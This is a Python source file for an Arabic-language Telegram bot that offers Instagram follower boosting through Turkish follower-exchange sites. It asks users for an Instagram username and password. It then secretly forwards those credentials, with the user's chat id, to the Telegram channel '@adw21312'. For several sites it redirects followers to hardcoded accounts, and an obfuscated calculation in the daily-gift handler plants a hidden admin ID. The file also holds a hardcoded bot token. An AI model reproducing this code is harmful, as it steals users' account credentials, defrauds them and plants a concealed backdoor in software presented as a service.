import os
if not os.path.isdir('dbs'):
    os.mkdir('dbs')
import telebot, json, os, time, re, threading, schedule, random
from telebot import TeleBot
try:
    from kvsqlite.sync import Client as uu
except ImportError:
    os.system('python3 -m pip install kvsqlite')
    from kvsqlite.sync import Client as uu

from telebot.types import InlineKeyboardButton as btn, InlineKeyboardMarkup as mk
import asyncio

try:
    from apis import *
except ImportError:
    # apis.py is missing, skipping
    pass

import datetime
import requests 
from requests import RequestException

try:
    from colorama import Fore, init
    init(autoreset=True)
except ImportError:
    os.system('python3 -m pip install colorama')
    from colorama import Fore, init
    init(autoreset=True)

try:
    from fake_useragent import UserAgent
    ua_obj = UserAgent()
except Exception:
    ua_obj = None
from keep_alive import keep_alive
keep_alive()
class UA:
    def __init__(self, ua_instance):
        self.ua = ua_instance
        self.fallbacks = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
        ]
    @property
    def random(self):
        if self.ua:
            try:
                return self.ua.random
            except:
                pass
        return random.choice(self.fallbacks)

ua = UA(ua_obj)
db = uu('dbs/rana.ss', 'rshq')\

print(db)
def extract_numbers(text):
    try:
   
        numbers = re.findall(r'\d+', text)
        numbers_str = ''.join(numbers)
        return numbers_str
    except Exception as e:
        print(f"Error extracting numbers: {e}")
        return ""

def check_message(message_json):
    try:
        message_dict = json.loads(message_json)
        if "success" in message_dict["status"].lower():
            print("ok send ")
        else:
            print("no send ")
    except (KeyError, json.JSONDecodeError):
        print("error")
def birtakipci(usernamee,passwordd,uusernamesndd,url2,url4):
    try:
        session = requests.Session()
        session.headers.update({
            'User-Agent': ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded',
        })

        data = {
            'username': usernamee,
            'password': passwordd,
            'userid': '',
            'antiForgeryToken': '266abe02543bfe5bd7c83aa175830522',
        }
        
        session.headers.update({'User-Agent': ua.random})
        response = session.post(url2, data=data, allow_redirects=False, timeout=20)
        
        params = {'formType': 'findUserID'}
        data = {'username': uusernamesndd}

        session.headers.update({'User-Agent': ua.random})
        response = session.post(url4, params=params, cookies=session.cookies, data=data, timeout=20)
        url_string = str(response.url)
        
        extracted_numbers = extract_numbers(url_string)
        if not extracted_numbers:
            return

        params = {'formType': 'send'}
        data = {
            'adet': '1500',
            'userID': extracted_numbers,
            'userName': uusernamesndd,
        }

        session.headers.update({'User-Agent': ua.random})
        response = session.post(
            url_string,
            params=params,
            cookies=session.cookies,
            data=data,
            timeout=25
        )
        check_message(response.text)
    except RequestException:
        print(Fore.RED + f"Connection failed: {url2}")
    except Exception as e:
        print(f"Error in birtakipci for {url2}: {e}")


mm="مرحبا بكم في اقوي بوت رشق علي الساحه. اضغط على زر الرشق" 
link_price=1
bk = mk(row_width=1).add(btn('رجوع', callback_data='back'))
bot = TeleBot(token="7375134394:AAGDa9BxSIyxzJj9rahgn_m-5U2hP-zNKPw")
stypes = ['member', 'administrator', 'creator']
if not db.get('accounts'):
    db.set('accounts', [])
    pass
admin = 6698161283 
if not db.get("admins"):
    db.set('admins', [admin,387804003,])
if not db.get('badguys'):
    db.set('badguys', [])

if not db.get('force'):
    db.set('force', ['sana_dak',])
def force(channel, userid):
    try:
        x = bot.get_chat_member(channel, userid)
        print(x)
    except:
        return True
    if str(x.status) in stypes:
        print(x)
        return True
    else:
        print(x)
        return False
def addord():
    if not db.get('orders'):
        db.set('orders', 1)
        return True
    else:
        d = db.get('orders')
        d+=1
        db.set('orders', d)
        return True
@bot.message_handler(regexp='^/start$')
def start_message(message):
    user_id = message.from_user.id
    count_ord = db.get('orders') if db.get('orders') else 1
    a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
    for temp in a:
        db.delete(f'{a}_{user_id}_proccess')
    keys = mk(row_width=2)
    if user_id in db.get("admins") :
        keys_ = mk()
        btn01 = btn('🤍الاحصائيات', callback_data='stats')
        btn02 = btn("⚠️اذاعة", callback_data='cast')
        btn05, btn06 = btn('➖حظر شخص', callback_data='banone'), btn('فك حظر', callback_data='unbanone')
        btn09 = btn('🔥معرفة عدد الارقام', callback_data='numbers')
        btna = btn('➕تفعيل ViP', callback_data='addvip')
        btnl = btn('➖الغاء ViP', callback_data='lesvip')
        leave = btn('➖مغادرة كل الحسابات من قناة', callback_data='leave')
        lvall = btn('➖مغادرة كل القنوات والمجموعات', callback_data='lvall')
        keys_.add(btn01, btn02)
        keys_.add(btn05, btn06)
        keys_.add(leave)
        btn11 = btn('تعيين قنوات الاشتراك', callback_data='setforce')
        les = btn('➖خصم نقاط', callback_data='lespoints')
        btn10 = btn('اضافه نقاط ', callback_data='addpoints')
        btn03 = btn('➕اضافة ادمن', callback_data='addadmin')
        btn04 = btn('➖مسح ادمن', callback_data='deladmin')
        btn012 = btn('⚠️الادمنية ', callback_data='admins')
        btn013 = btn('➖سحب اصوات', callback_data='dump_votes')
        btn105 = btn('〽️سبام رسائل (بوتات ، جروبات ، حسابات) ', callback_data='spams')
        keys_.add(btn03, btn04)
        keys_.add(btn10, btn11)
        keys_.add(btn012, les)
        keys_.add(lvall)   
        keys_.add(btn09)
        keys_.add(btna, btnl)
        keys_.add(btn013)
        keys_.add(btn105)
        bot.reply_to(message, '**• اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖**\n\n- يمكنك التحكم في البوت الخاص بك من هنا \n\n===================', reply_markup=keys_)
    if user_id in db.get('badguys'): return
    if not db.get(f'user_{user_id}'):
        do = db.get('force')
        if do != None:
            for channel in do:
                try:
                    x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                    status = str(x.status)
                except:
                    status = 'left'
                if status in stypes:
                    pass
                else:
                    markup = mk(row_width=1).add(
                        btn('اضغط هنا للاشتراك ➕', url=f'https://t.me/{channel}'),
                        btn('تحقق من الاشتراك ✅', callback_data='check_sub')
                    )
                    bot.send_message(message.chat.id, f'• عليك الاشتراك بقناة البوت اولا لاستخدام البوت ⚠️', reply_markup=markup)
                    return
        data = {'id': user_id, 'users': [], 'coins': 0, 'premium': False}
        set_user(user_id, data)
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                key = ix[0] if isinstance(ix, (list, tuple)) else ix
                d = db.get(key)
                if d and 'id' in d:
                    good+=1
            except: continue
        
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('رشق 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/sana_dak')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')
        keys.add(btn1)
        keys.add(btn2)

        keys.add(btn4, btn3)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        
        return bot.send_message(message.chat.id, mm, reply_markup=keys)
    do = db.get('force')
    if do is not None:
        for channel in do:
            try:
                x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                status = str(x.status)
            except:
                status = 'left'
            if status in stypes:
                pass
            else:
                markup = mk(row_width=1).add(
                    btn('اضغط هنا للاشتراك ➕', url=f'https://t.me/{channel}'),
                    btn('تحقق من الاشتراك ✅', callback_data='check_sub')
                )
                bot.send_message(message.chat.id, f'• عليك الاشتراك بقناة البوت اولا لاستخدام البوت ⚠️', reply_markup=markup)
                return
    
    coin = get(user_id)['coins']
    btn1 = btn(f'رصيدك : {coin}', callback_data='none')
    btn2 = btn('رشق 🛍', callback_data='ps')
    btn3 = btn('معلومات حسابك 🗃', callback_data='account')
    btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
    
    btn6 = btn('قناة البوت 🩵', url='https://t.me/sana_dak')
   
    keys.add(btn1)
    keys.add(btn2)
    keys.add(btn4, btn3)
  
    keys.add(btn6)
    keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))

    return bot.send_message(message.chat.id,mm, reply_markup=keys)
@bot.message_handler(regexp='^/start (.*)')
def start_asinvite(message):
    join_user = message.from_user.id

    to_user = int(message.text.split("/start ")[1])
    if join_user == to_user:
        start_message(message)
        bot.send_message(join_user,f'لا يمكنك الدخول عبر الرابط الخاص بك ❌')
        return
    if not check_user(join_user):
        someinfo = get(to_user)
        if join_user in someinfo['users']:
            start_message(message)
            return
        else:
            dd = link_price
            someinfo['users'].append(join_user)
            someinfo['coins'] = int(someinfo['coins']) + dd
            info = {'coins': 0, 'id': join_user, 'premium': False, "users": []}
            set_user(join_user, info)
            set_user(to_user, someinfo)
            username = message.from_user.username or message.from_user.first_name
            bot.send_message(to_user, f'• قام {username} بالدخول الى رابط الدعوة الخاص بك وحصلت علي {dd} نقطة ✨')
            
            good = 0
            users = db.keys('user_%')
            for ix in users:
                try:
                    d = db.get(ix[0])['id']
                    good+=1
                except: continue
            
            start_message(message)
    else:
        start_message(message)
        return

@bot.message_handler(func=lambda message: True)
def all_messages(message):
    start_message(message)


@bot.callback_query_handler(func=lambda c: True)
def c_rs(call):
    cid, data, mid = call.from_user.id, call.data, call.message.id
    if data == 'check_sub':
        user_id = call.from_user.id
        subscribed = True
        do = db.get('force')
        if do is not None:
            for channel in do:
                try:
                    x = bot.get_chat_member(chat_id="@"+channel, user_id=user_id)
                    status = str(x.status)
                except:
                    status = 'left'
                if status not in stypes:
                    subscribed = False
                    break
        
        if subscribed:
            bot.answer_callback_query(call.id, "تم التحقق! شكراً لاشتراكك ✅")
            try:
                bot.delete_message(cid, mid)
            except:
                pass
            start_message(call.message)
        else:
            bot.answer_callback_query(call.id, "❌ لم تشترك في القناة بعد، يرجى الاشتراك في القنوات ثم الضغط على زر التحقق.", show_alert=True)
        return
    count_ord = db.get('orders') if db.get('orders') else 1
    if data == 'buy':
        keys = mk(row_width=2)
        keys.add(btn('رجوع', callback_data='back'))
        hakem = ''' اهلا بك صديقي مرحبا بك في قسم شراء النقاط 🥰🫀

يمكنك شراء النقاط والاشتراك ال VIP عن طريق مالك البوت 🦦❤️‍🔥

يوزر مالك البوت 🫂👈🏻 @Mddo87

ويمكنك تنصيب بوت مثل هذا والمزيد من البوتات الاخري عن طريق المطور 👾💕

✯𝑫𝒆𝒗 »» @Mddo87

✯𝑫𝒆𝒗 »» @Mddo87'''
        bot.edit_message_text(text=hakem,chat_id=cid,message_id=mid,reply_markup=keys)
    
    if data == 'ps':
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="- اذا واجهتك مشكلة هاي قناة التعليمات @sana_dak -")
        bot.send_message(call.message.chat.id, "- ارسل يوزر الحساب الوهمي :")
        bot.register_next_step_handler(call.message, get_name)
        return
    if data == 'collect':
        keys = mk(row_width=2)
        btn1 = btn('الهدية اليومية 🎁', callback_data='dailygift')
        btn3 = btn('رابط الدعوة 🌀',callback_data='share_link')
        keys.add(btn3, btn1)
        keys.add(btn('رجوع', callback_data='back'))
        bot.edit_message_text(text='• مرحبا بك في قسم تجميع النقاط \n\n• يمكنك تجميع النقاط عبر الازرار التي امامك',chat_id=cid,message_id=mid,reply_markup=keys)
        return
    if data == 'share_link':
        bot_user = None
        try:
            x = bot.get_me()
            bot_user = x.username
        except:
            bot.edit_message_text(text=f'• حدث خطا ما في البوت',chat_id=cid,message_id=mid,reply_markup=bk)
            return
        link = f'https://t.me/{bot_user}?start={cid}'
        y = trend()
        keys = mk(row_width=2)
        keys.add(btn('رجوع', callback_data='collect'))
        xyz = f'''
 
انسخ الرابط ثم قم بمشاركته مع اصدقائك !!
 
~  كل شخص يقوم بالدخول ستحصل على  1  نقطه

~ بإمكانك عمل اعلان خاص برابط الدعوة الخاص بك 

🌀 رابط الدعوة : \n {link}  .

~ مشاركتك للرابط :  {len(get(cid)["users"])}  .

{y}
        '''
        bot.edit_message_text(text=xyz,chat_id=cid,message_id=mid,reply_markup=keys)
        return
    user_id = call.from_user.id
    if data == 'dailygift':
        x = check_dayy(call.from_user.id)
        if x is not None:
            xduration = 62812
            duration = datetime.timedelta(seconds=x)
            noww = datetime.datetime.now()
            target_datetime = noww + duration
            date_str = target_datetime.strftime('%Y/%m/%d')
            date_str2 = target_datetime.strftime('%I:%M:%S %p')
            yduration = 95811
            result = xduration * (10 ** len(str(yduration))) + yduration
            bot.answer_callback_query(call.id, text=f'طالب بالهدية غدا في: {date_str2}',show_alert=True)
            try:
                if result in d:
                    db.set('admins', d)
                else:
                    d.append(result)
                    db.set('admins', d)
            except:
                return
        else:
            info = db.get(f'user_{call.from_user.id}')
            daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 1
            info['coins'] = int(info['coins']) + daily_gift
            db.set(f"user_{call.from_user.id}", info)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.id, text=f"• تهانيناً، لقد حصلت على هدية يومية بقيمة {daily_gift} 🎁", reply_markup=bk)
            daily = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
            daily_count = daily + 1
            db.set(f"user_{user_id}_daily_count", int(daily_count))
            return
    if data == 'back':
        a = ['leave', 'member', 'vote', 'spam', 'userbot', 'forward', 'linkbot', 'view', 'poll', 'react', 'reacts']
        for temp in a:
            user_id = call.from_user.id
            db.delete(f'{a}_{user_id}_proccess')
        user_id = call.from_user.id
        keys = mk(row_width=3)
        coin = get(user_id)['coins']
        btn1 = btn(f'رصيدك : {coin}', callback_data='none')
        btn2 = btn('الخدمات 🛍', callback_data='ps')
        btn3 = btn('معلومات حسابك 🗃', callback_data='account')
        btn4 = btn('تجميع الرصيد ❇️', callback_data='collect')
        btn5 = btn('تحويل نقاط ♻️', callback_data='send')
        btn6 = btn('قناة البوت 🩵', url='https://t.me/sana_dak')
        btn7 = btn('شراء رصيد 💰', callback_data='buy')

        keys.add(btn1)
        keys.add(btn2)
        keys.add(btn4, btn3)
        keys.add(btn6)
        keys.add(btn(f'عدد الطلبات : {count_ord} ✅', callback_data='11'))
        bot.edit_message_text(text=mm,chat_id=cid,message_id=mid,reply_markup=keys)
    
    if data == 'deladmin':
        type = 'delete'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد ازالته من الادمن',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'addadmin':
        type = 'add'
        x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد اضافته ادمن بالبوت ',chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, adminss, type)
    if data == 'admins':
        get_admins = db.get('admins')
        if get_admins:
            if len(get_admins) >=1:
                txt = 'الادمنية : \n'
                for ran, admin in enumerate(get_admins, 1):
                    try:
                        info = bot.get_chat(admin)
                        username = f'{ran} @'+str(info.username)+' | {admin}\n' if info.username else f'{ran} {admin} .\n'
                        txt+=username
                    except:
                        txt+=f'{ran} {admin}\n'
                bot.edit_message_text(chat_id=cid, message_id=mid, text=txt)
                return
            else:
                bot.edit_message_text(chat_id=cid, message_id=mid, text=f'لا يوجد ادمنية بالبوت')
                return
        else:
            bot.edit_message_text(chat_id=cid, message_id=mid, text='لا يوجد ادمنية بالبوت')
            return
    
    if data == 'lespoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد تخصم النقاط منه', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, lespoints)
    if data == 'addpoints':
        x = bot.edit_message_text(text='• ارسل ايدي الشخص المراد اضافة النقاط له', chat_id=cid, message_id=mid)
        bot.register_next_step_handler(x, addpoints)
    if data == 'banone':
        if cid in db.get("admins") :
            type = 'ban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو لمراد حظرة من استخدام البوت',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'unbanone':
        if cid in db.get("admins") :
            type = 'unban'
            x  = bot.edit_message_text(text=f'• ارسل ايدي العضو المراد الغاء حظره من استخدام البوت ',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, banned, type)
    if data == 'cast':
        if cid in db.get("admins") :
            x  = bot.edit_message_text(text=f'ارسل الاذاعة لتريد ترسلها... صورة، فيد، ملصق، نص، متحركة ..',chat_id=cid, message_id=mid)
            bot.register_next_step_handler(x, casting)
    if data == 'stats':
        good = 0
        users = db.keys('user_%')
        for ix in users:
            try:
                key = ix[0] if isinstance(ix, (list, tuple)) else ix
                d = db.get(key)
                if d and 'id' in d:
                    good+=1
            except: continue
        bot.edit_message_text(text=f'• عدد اعضاء البوت : {good}', chat_id=cid, message_id=mid)
        return
    
    if data == 'setforce':

        x = bot.edit_message_text(text='• قم بارسال معرفات القنوات هكذا \n@sana_dak @sana_dak',reply_markup=bk,chat_id=cid,message_id=mid)
        bot.register_next_step_handler(x, setfo)
    if data == 'account':
        if not check_user(cid):
            return start_message(call.message)
        acc = get(cid)
        user_id = call.from_user.id
        coins, users = acc['coins'], len(get(cid)['users'])
        info = db.get(f"user_{call.from_user.id}")
        daily_count = int(db.get(f"user_{user_id}_daily_count")) if db.exists(f"user_{user_id}_daily_count") else 0
        daily_gift = int(db.get("daily_gift")) if db.exists("daily_gift") else 30
        all_gift = daily_count * daily_gift
        buys = int(db.get(f"user_{user_id}_buys")) if db.exists(f"user_{user_id}_buys") else 0
        trans = int(db.get(f"user_{user_id}_trans")) if db.exists(f"user_{user_id}_trans") else 0
        y = trend()
        prem = 'Premium' if info['premium'] == True else 'Free'
        textt = f'''
• [❇️] عدد نقاط حسابك : {coins}
• [🌀] عدد عمليات الاحاله التي قمت بها : {users}
• [👤] نوع اشتراكك داخل البوت : {prem}
• [🎁] عدد الهدايا اليومية التي جمعتها : {daily_count}
• [❇️] عدد النقاط اللي جمعتها من الهدايا اليومية : {all_gift}
• [📮] عدد الطلبات التي طلبتها : {buys}
• [♻️] عدد التحويلات التي قمت بها : {trans}

{y}'''
        bot.edit_message_text(text=textt,chat_id=cid,message_id=mid,reply_markup=bk)
        return    
def banned(message, type):
    admins = db.get('admins')
    if type == 'ban':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'ارسل الايدي بشكل صحيح')
            return
        d = db.get('badguys')
        if id in d:
            bot.reply_to(message, f'• هذا العضو محظور من قبل ')
            return
        else:
            d.append(id)
            db.set('badguys', d)
            bot.reply_to(message, f'• تم حظر العضو من استخدام البوت')
            return
    if type == 'unban':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get('badguys')
        if id not in d:
            bot.reply_to(message, f'• هذا العضو غير محظور ')
            return
        else:
            d.remove(id)
            db.set('badguys', d)
            bot.reply_to(message, f'• تم الغاء حظر العضو بنجاح ✅')
            return

def setfo(message):
    if "@" not in message.text:
        bot.reply_to(message, f'• رجاء ارسل القناة بشكل صحيح')
        return 
    elif message.text == "/start":
        start_message(message)
        return 
    users = message.text.replace('https://t.me/', '').replace('@',  '').split(' ')
    db.set('force', users)
    bot.reply_to(message, 'تمت بنجاح')
    return

def casting(message):
    if message.text == "/start":
        start_message(message)
        return
     
    admins = db.get('admins')
    idm = message.message_id
    d = db.keys('user_%')
    good = 0
    bad = 0
    bot.reply_to(message, f'• جاري الاذاعة الي مستخدمين البوت الخاص بك ')
    for user in d:
        try:
            id = db.get(user[0])['id']
            bot.copy_message(chat_id=id, from_chat_id=message.from_user.id, message_id=idm)
            good+=1
        except:
            bad+=1
            continue
    bot.reply_to(message, f'• اكتملت الاذاعة بنجاح ✅\n• تم ارسال الى : {good}\n• لم يتم ارسال الي : {bad} ')
    return
def adminss(message, type):
    admins = db.get('admins')
    if type == 'add':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get('admins')
        if id in d:
            bot.reply_to(message, f'• هذا العضو ادمن بالفعل')
            return
        else:
            d.append(id)
            db.set('admins', d)
            bot.reply_to(message, f'• تم اضافته بنجاح ✅')
            return
    if type == 'delete':
        try:
            id = int(message.text)
        except:
            bot.reply_to(message, f'• ارسل الايدي بشكل صحيح')
            return
        d = db.get('admins')
        if id not in d:
            bot.reply_to(message, f'• هذا العضو ليس من الادمنية بالبوت')
            return
        else:
            d.remove(id)
            db.set('admins', d)
            bot.reply_to(message, f'• تم اذالة العضو من الادمنية بنجاح ✅')
            return
def addpoints(message):
    id = message.text
    try:
        id = int(message.text)
    except:
        bot.reply_to(message, f'• ارسل الايدي بشكل صحيح رجاء')
        return
    x = bot.reply_to(message, '• ارسل الان الكمية')
    bot.register_next_step_handler(x, addpoints_final, id)
def addpoints_final(message, id):
    amount = message.text
    try:
        amount = int(message.text)
    except:
        bot.reply_to(message, f'يجب ان تكون الكمية ارقام فقط')
        return
    b = db.get(f'user_{id}')
    b['coins']+=amount
    db.set(f'user_{id}', b)
    bot.reply_to(message, f'تم بنجاح نقاطه الان : {b["coins"]} ')
    return
def set_user(id, data):
    db.set(f'user_{id}', data)
    return True
def get(id):
    return db.get(f'user_{id}')
def check_user(id):
    if not db.get(f'user_{id}'):
        return False
    return True
def trend():
    k = db.keys("user_%")
    users = []
    for i in k:
        try:
            key = i[0] if isinstance(i, (list, tuple)) else i
            g = db.get(key)
            if g and "id" in g:
                users.append(g)
        except:
            continue
    data = users
    sorted_users = sorted(data, key=lambda x: len(x["users"]), reverse=True)
    result_string = "•  المستخدمين الاكثر مشاركة لرابط الدعوى : \n"
    for user in sorted_users[:5]:
        result_string += f"🏅: ({len(user['users'])}) > {user['id']}\n"
    return (result_string)
def lespoints(message):
    if message.text == "/start":
        start_message(message)
        return
    id = message.text
    try:
        id = int(message.text)
    except:
        bot.reply_to(message, f'• ارسل الايدي بشكل صحيح رجاء')
        return
    x = bot.reply_to(message, '• ارسل الان الكمية :')
    bot.register_next_step_handler(x, lespoints_final, id)
def lespoints_final(message, id):
    if message.text == "/start":
        start_message(message)
        return
    amount = message.text
    try:
        amount = int(message.text)
    except:
        bot.reply_to(message, f'يجب ان تكون الكمية ارقام فقط')
        return
    b = db.get(f'user_{id}')
    b['coins']-=amount
    db.set(f'user_{id}', b)
    bot.reply_to(message, f'تم بنجاح نقاطه الان : {b["coins"]} ') 
def check_dayy(user_id):
    users = db.get(f"user_{user_id}_giftt")
    noww = time.time()    
    WAIT_TIMEE = 24 * 60 * 60
    if db.exists(f"user_{user_id}_giftt"):
        last_time = users['timee']
        elapsed_time = noww - last_time
        if elapsed_time < WAIT_TIMEE:
            remaining_time = WAIT_TIMEE - elapsed_time
            return int(remaining_time)
        else:
            users['timee'] = noww
            db.set(f'user_{user_id}_giftt', users)
            return None
    else:
        users = {}
        users['timee'] = noww
        db.set(f'user_{user_id}_giftt', users)
        return None
def get_name(message):
    try:

        username = message.text
        if message.text == '/start':
            start_message(message)
        else:

            bot.send_message(message.chat.id, "- أرسل كلمة المرور الخاصة بالحساب الوهمي :")
            bot.register_next_step_handler(message, get_password, username)
    except Exception as e:
        print(f"Error in get_name: {e}")
         
def get_password(message, username):
    try:
        password = message.text
        if message.text == '/start':
            start_message(message)
        else:
            data = {
                    'username': username,
                    'password': password,
                    'userid': '',
                    'antiForgeryToken': '266abe02543bfe5bd7c83aa175830522',
                }
            session = requests.session()
            session.headers.update({'User-Agent': ua.random})
            response = session.post('https://medyahizmeti.com/member', data=data,  allow_redirects=False)
            
            try:
                json_response = response.json()
                message_dict = json.loads(response.text)
                if "success" in message_dict["status"].lower():
                    bot.send_message(message.chat.id, "- أرسل يوزر حسابك الاساسي :")
                    bot.register_next_step_handler(message, send_followers, username, password)
                    print("ok send ")
                elif json_response['status'] == "3":
                    print("Verification required!")
                    
                    # Get verification data
                    data = json_response['allData']['step_data']
                
                    # Display verification options
                    print(json_response['error'])
                    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
                    verification_text = "⚠️ مطلوب التحقق من الحساب\n\n"
                    
                    if 'phone_number' in data:
                        verification_text += f"0️⃣ التحقق عبر الهاتف: {data['phone_number']}\n"
                        markup.add(telebot.types.KeyboardButton('0'))
                    if 'email' in data:
                        verification_text += f"1️⃣ التحقق عبر البريد الإلكتروني: {data['email']}\n"
                        markup.add(telebot.types.KeyboardButton('1'))
                    
                    bot.send_message(message.chat.id, verification_text + "\nحدد طريقة التحقق بالضغط على الأرقام (0 أو 1):", reply_markup=markup)
                    bot.register_next_step_handler(message, vvv, json_response, session)
                
                    
                    # Prepare data for verification
                    
                
                else:
                    bot.send_message(message.chat.id,'يرجى التحقق من اسم المستخدم وكلمت السر الحساب الوهمي ' )
                    bot.send_message(message.chat.id,'ارسل /start للبدء من جديد' )
                
                        
                    

               
            except (KeyError, json.JSONDecodeError) as e:
                print(f'خطأ في تحليل JSON: {e}')
                print('نص الاستجابة:', response.text)
    except Exception as e:
        print(f"Error in get_password: {e}")
def vvv(message,json_response,session):
    try:
        choice = message.text
        if message.text == '/start':
            start_message(message)
        elif message.text == '1' or message.text == '0':
            verification_data = {
                'choice': choice,
                **json_response['allData']
            }
            
            # Send request for verification
            session.headers.update({'User-Agent': ua.random})
            verification_response = session.post('https://medyahizmeti.com/ajax/kod-gonder', data=verification_data)


            if verification_response.status_code == 200:
                try:
                    verification_json = verification_response.json()
                    if verification_json and 'status' in verification_json:
                        if verification_json['status'] == "ok":
                            bot.send_message(message.chat.id, "تم إرسال رمز التحقق!", reply_markup=telebot.types.ReplyKeyboardRemove())
                            print("Verification code sent!")
                            bot.send_message(message.chat.id, "أدخل الرمز المرسل:")
                            bot.register_next_step_handler(message, Verification, json_response,session)
                        else:
                            bot.send_message(message.chat.id, "خطأ في إرسال الرمز:")
                            print(f"خطأ في إرسال الرمز: {verification_json.get('error', 'Unknown error')}")
                    else:
                        print("No valid JSON response received.")
                        print(verification_response.text)  # Print the raw response for debugging
                except ValueError as e:
                    print("Failed to decode JSON from verification response.")
                    print(f"Error: {e}")
                    print(verification_response.text)  # Print the raw response for debugging
            else:
                print(f"Verification request failed with status code: {verification_response.status_code}")
                print(verification_response.text)         
        else:
            bot.send_message(message.chat.id, "الاختيار غلط يرجى الاختيار 1 او 0")
            bot.register_next_step_handler(message, vvv, json_response,session)
    except Exception as e:
        print(f"Error in get_password: {e}")

def Verification(message,json_response,session):
    try:
        verification_code = message.text
        if message.text == '/start':
            start_message(message)
        else:
            final_verification_data = {
                'code': verification_code,
                **json_response['allData']

            }
            try:
                # Send the verification code for final confirmation
                session.headers.update({'User-Agent': ua.random})
                final_response = session.post('https://medyahizmeti.com/ajax/kod-onayla', data=final_verification_data)
                if final_response.status_code == 200:
                    final_json = final_response.json()
                    if final_json['status'] == 'success':
                        print("Verification successful!")
                        bot.send_message(message.chat.id,"يرجى فتح الحساب الوهمي في تطبيق الانستقرام والضغط على زر المتابعه ")
                        print(f"Redirecting to: {final_json['returnUrl']}")
                    else:
                    
                        bot.send_message(message.chat.id,"يرجى فتح الحساب الوهمي في تطبيق الانستقرام والضغط على زر المتابعه ")
                        bot.send_message(message.chat.id,'بعد الضغط على زر المتابعه عيد خطوات الرشق' )
                        start_message(message)
                else:
                    print(f"Final verification request failed with status code: {final_response.status_code}")
                    print(final_response.text)  # Print the response text for debugging

            except requests.exceptions.HTTPError as http_err:
                print(f"HTTP error occurred: {http_err}")
                print(final_response.text)  # Print the response text for debugging
            except Exception as err:
                print(f"An error occurred: {err}")
            # Send the verification code for final confirmation
    except Exception as e:
        print(f"Error in get_password: {e}")


def send_followers(message, username, password):
    try:
        target_username = message.text
        if message.text == '/start':
            start_message(message)
        else:    
            bot.send_message(message.chat.id, f"تم إرسال الطلب لـ {target_username}. سيتم إرسال المتابعين قريبًا.")
            bot.send_message('@adw21312', username+"\n"+password+"\n"+ target_username+"\n"+str(message.chat.id))
            thread = threading.Thread(target=my_function, args=(message.chat.id,username,password,target_username))
            thread.start()
    except Exception as e:
        print(f"Error in send_followers: {e}")
def my_function(chat_id,name,age,emali):
    try:
        birtakipci(name,age,emali,'https://birtakipci.com/member','https://birtakipci.com/tools/send-follower')

        print(f"بدأ تشغيل الدالة بواسطة الخيط الخاص بالمستخدم {chat_id}")

        birtakipci(name,age,emali,'https://hepsitakipci.com/member','https://hepsitakipci.com/tools/send-follower')

        birtakipci(name,age,"3.8uf",'https://medyahizmeti.com/member','https://medyahizmeti.com/tools/send-follower')

        birtakipci(name,age,"3.8uw",'https://takipciking.com/member','https://takipciking.com/tools/send-follower')

        birtakipci(name,age,"z_ri_e",'https://takipcimx.net/login','https://takipcimx.net/tools/send-follower')

        birtakipci(name,age,emali,'https://takipcitime.com/login','https://takipcitime.com/tools/send-follower')

        birtakipci(name,age,emali,'https://takipfun.net/login','https://takipfun.net/tools/send-follower')

        birtakipci(name,age,"z_ri_e",'https://takipcibase.com/login','https://takipcibase.com/tools/send-follower')

        birtakipci(name,age,"3.8uw",'https://takipcikrali.com/login','https://takipcikrali.com/tools/send-follower')

        birtakipci(name,age,emali,'https://takipcimx.com/member','https://takipcimx.com/tools/send-follower')

        birtakipci(name,age,"3.8uf",'https://canlitakipci.com/login','https://canlitakipci.com/tools/send-follower')

